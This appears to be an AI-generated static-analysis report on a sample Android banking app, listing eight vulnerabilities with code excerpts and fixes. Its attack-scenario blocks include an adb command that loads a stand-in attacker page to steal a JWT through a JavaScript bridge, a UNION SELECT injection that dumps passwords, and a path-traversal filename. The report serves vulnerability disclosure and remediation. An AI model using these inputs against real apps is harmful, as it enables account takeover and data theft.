# Security Scan Report: BankingApp v2.3.1

**Scan Date**: 2026-02-27
**Tool**: Claude AI SAST
**Package**: com.example.bankingapp
**Target SDK**: 33
**Findings**: 8 (3 Critical, 3 High, 2 Medium)

---

## Finding 1: WebView JavaScript Bridge Token Leak

**Severity**: Critical
**CVSS**: 9.3
**Category**: WebView Security
**CWE**: CWE-749 (Exposed Dangerous Method)

### Location
- **File**: com/example/bankingapp/ui/WebViewActivity.java
- **Line**: 45, 78, 89

### Description
The application registers a JavaScript interface (`addJavascriptInterface`) that exposes sensitive methods including token retrieval. The WebView loads URLs from Intent parameters without validation, allowing any external attacker to call these methods.

### Vulnerable Code
```java
// Line 45
webView.addJavascriptInterface(new BankBridge(), "BankInterface");

// Line 78
String url = getIntent().getStringExtra("targetUrl");
webView.loadUrl(url);  // No validation!

// Line 89 - Bridge class
class BankBridge {
    @JavascriptInterface
    public String getAuthToken() {
        return SharedPrefs.get("jwt_token");  // LEAKS TOKEN!
    }

    @JavascriptInterface
    public String getAccountInfo() {
        return userAccount.toJson();  // LEAKS DATA!
    }
}
```

### Attack Scenario
```bash
# Attacker can trigger:
adb shell am start \
  -n com.example.bankingapp/.ui.WebViewActivity \
  --es targetUrl "https://attacker.com/steal.html"

# steal.html:
window.BankInterface.getAuthToken()  // Returns JWT
window.BankInterface.getAccountInfo()  // Returns account data
```

### Remediation Priority
**P0 (Immediate)** - This vulnerability allows complete account takeover.

---

## Finding 2: SQL Injection in ContentProvider

**Severity**: Critical
**CVSS**: 9.0
**Category**: SQL Injection
**CWE**: CWE-89 (SQL Injection)

### Location
- **File**: com/example/bankingapp/data/TransactionProvider.java
- **Line**: 127

### Description
The ContentProvider's `query()` method constructs SQL queries using string concatenation with unsanitized user input from the URI projection parameter.

### Vulnerable Code
```java
// Line 127
public Cursor query(Uri uri, String[] projection, String selection,
                   String[] selectionArgs, String sortOrder) {
    String table = getTableName(uri);

    // VULNERABLE: projection comes directly from URI
    String sql = "SELECT " + TextUtils.join(",", projection) +
                 " FROM " + table;

    return db.rawQuery(sql, null);  // No prepared statement!
}
```

### Attack Scenario
```bash
# Attacker can inject SQL:
adb shell content query \
  --uri content://com.example.bankingapp.provider/transactions \
  --projection "* FROM transactions UNION SELECT password FROM users--"

# This bypasses authentication and dumps all passwords
```

### Remediation Priority
**P0 (Immediate)** - Database compromise possible.

---

## Finding 3: Hardcoded AWS Credentials

**Severity**: Critical
**CVSS**: 9.8
**Category**: Hardcoded Secrets
**CWE**: CWE-798 (Use of Hard-coded Credentials)

### Location
- **File**: com/example/bankingapp/api/S3Uploader.java
- **Line**: 34, 35

### Description
Production AWS access keys are hardcoded in the source code, allowing anyone with access to the APK to extract and use these credentials.

### Vulnerable Code
```java
// Line 34-35
private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

// Line 52 - Used for file uploads
AmazonS3 s3Client = AmazonS3ClientBuilder.standard()
    .withCredentials(new AWSStaticCredentialsProvider(
        new BasicAWSCredentials(AWS_ACCESS_KEY, AWS_SECRET_KEY)))
    .build();
```

### Impact
- Attacker can access all S3 buckets with these credentials
- Can read/modify/delete user documents
- Can incur unlimited AWS charges
- Potential data breach of all stored files

### Remediation Priority
**P0 (Immediate)** - Rotate credentials and use AWS Cognito or IAM roles.

---

## Finding 4: Exported Activity Without Permission

**Severity**: High
**CVSS**: 8.5
**Category**: Exported Components
**CWE**: CWE-927 (Exposed Component)

### Location
- **File**: AndroidManifest.xml
- **Line**: 67

### Description
The `AdminPanelActivity` is exported without requiring any permission, allowing any app on the device to launch it and access administrative functions.

### Vulnerable Code
```xml
<!-- Line 67 -->
<activity
    android:name=".admin.AdminPanelActivity"
    android:exported="true">  <!-- NO PERMISSION! -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
    </intent-filter>
</activity>
```

### Attack Scenario
```bash
# Any malicious app can launch:
adb shell am start \
  -n com.example.bankingapp/.admin.AdminPanelActivity

# Admin panel loads without authentication
```

### Remediation Priority
**P1 (This Sprint)** - Add custom permission or set exported=false.

---

## Finding 5: Path Traversal in File Handler

**Severity**: High
**CVSS**: 8.0
**Category**: Path Traversal
**CWE**: CWE-22 (Path Traversal)

### Location
- **File**: com/example/bankingapp/utils/FileHandler.java
- **Line**: 89

### Description
The file handler accepts file paths from Intent extras without sanitization, allowing attackers to read arbitrary files using path traversal sequences.

### Vulnerable Code
```java
// Line 89
public File getDocument(Intent intent) {
    String filename = intent.getStringExtra("filename");

    // VULNERABLE: No path validation
    return new File(getExternalFilesDir(null), filename);
}

// Line 102 - File is then read
FileInputStream fis = new FileInputStream(getDocument(intent));
```

### Attack Scenario
```bash
# Read sensitive files:
adb shell am start \
  -n com.example.bankingapp/.DocumentActivity \
  --es filename "../../databases/accounts.db"

# This reads the database file instead of documents
```

### Remediation Priority
**P1 (This Sprint)** - Validate file paths and use canonical path checking.

---

## Finding 6: Insecure Random for Session Tokens

**Severity**: High
**CVSS**: 7.5
**Category**: Weak Cryptography
**CWE**: CWE-338 (Use of Cryptographically Weak PRNG)

### Location
- **File**: com/example/bankingapp/auth/SessionManager.java
- **Line**: 56

### Description
Session tokens are generated using `java.util.Random` instead of `SecureRandom`, making them predictable and vulnerable to brute-force attacks.

### Vulnerable Code
```java
// Line 56
public String generateSessionToken() {
    Random random = new Random();  // INSECURE!
    StringBuilder token = new StringBuilder();

    for (int i = 0; i < 32; i++) {
        token.append(CHARS.charAt(random.nextInt(CHARS.length())));
    }

    return token.toString();
}
```

### Impact
- Session tokens can be predicted
- Attacker can hijack active sessions
- Potential for account takeover

### Remediation Priority
**P1 (This Sprint)** - Use `SecureRandom` instead.

---

## Finding 7: Deep Link Hijacking - OAuth Callback

**Severity**: Medium
**CVSS**: 6.5
**Category**: Deep Link Security
**CWE**: CWE-939 (Improper Authorization in Handler for Custom URL Scheme)

### Location
- **File**: AndroidManifest.xml
- **Line**: 89
- **Related Code**: com/example/bankingapp/auth/OAuthActivity.java:45

### Description
The OAuth callback uses a custom URL scheme without host verification, allowing malicious apps to register the same scheme and intercept authorization codes.

### Vulnerable Code
```xml
<!-- Line 89 - AndroidManifest.xml -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="bankingapp" />  <!-- NO HOST! -->
</intent-filter>
```

```java
// OAuthActivity.java:45
Uri data = getIntent().getData();
String authCode = data.getQueryParameter("code");  // No verification
exchangeCodeForToken(authCode);  // Accepts any code
```

### Attack Scenario
```bash
# Malicious app registers same scheme
# User completes OAuth → code sent to malicious app
# Attacker steals authorization code
```

### Remediation Priority
**P2 (Next Sprint)** - Use App Links with verified domain or add host to scheme.

---

## Finding 8: Cleartext Transmission of Credentials

**Severity**: Medium
**CVSS**: 6.5
**Category**: Insecure Communication
**CWE**: CWE-319 (Cleartext Transmission)

### Location
- **File**: com/example/bankingapp/api/ApiClient.java
- **Line**: 78

### Description
The API client has a debug flag that forces HTTP instead of HTTPS, and this flag is still enabled in the release build.

### Vulnerable Code
```java
// Line 78
private static final boolean DEBUG_MODE = true;  // Should be FALSE!

// Line 92
public String getBaseUrl() {
    if (DEBUG_MODE) {
        return "http://api.example.com";  // CLEARTEXT!
    }
    return "https://api.example.com";
}
```

### Impact
- Credentials transmitted over HTTP
- Man-in-the-middle attacks possible
- Session tokens exposed on network

### Remediation Priority
**P2 (Next Sprint)** - Set DEBUG_MODE = false for release builds.

---

## Summary Statistics

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | 3 | 37.5% |
| High | 3 | 37.5% |
| Medium | 2 | 25.0% |
| **Total** | **8** | **100%** |

### By Category

| Category | Findings |
|----------|----------|
| WebView Security | 1 |
| SQL Injection | 1 |
| Hardcoded Secrets | 1 |
| Exported Components | 1 |
| Path Traversal | 1 |
| Weak Cryptography | 1 |
| Deep Link Security | 1 |
| Insecure Communication | 1 |

### Risk Score
**Overall Risk: CRITICAL**

The application has 3 critical vulnerabilities that allow:
- Complete account takeover (Finding 1)
- Database compromise (Finding 2)
- Cloud infrastructure access (Finding 3)

**Immediate action required** before production deployment.

---

## Recommended Actions

### Immediate (P0)
1. Fix WebView Bridge token leak (Finding 1)
2. Fix SQL injection in ContentProvider (Finding 2)
3. Rotate AWS credentials and implement secure storage (Finding 3)

### This Sprint (P1)
4. Add permission to AdminPanelActivity (Finding 4)
5. Implement path validation (Finding 5)
6. Use SecureRandom for tokens (Finding 6)

### Next Sprint (P2)
7. Implement App Links for OAuth (Finding 7)
8. Disable debug mode in release (Finding 8)

---

**Report Generated by**: Claude AI SAST Engine v2.0
**Scan Duration**: 8 minutes
**Files Analyzed**: 247
**Lines of Code**: 18,439
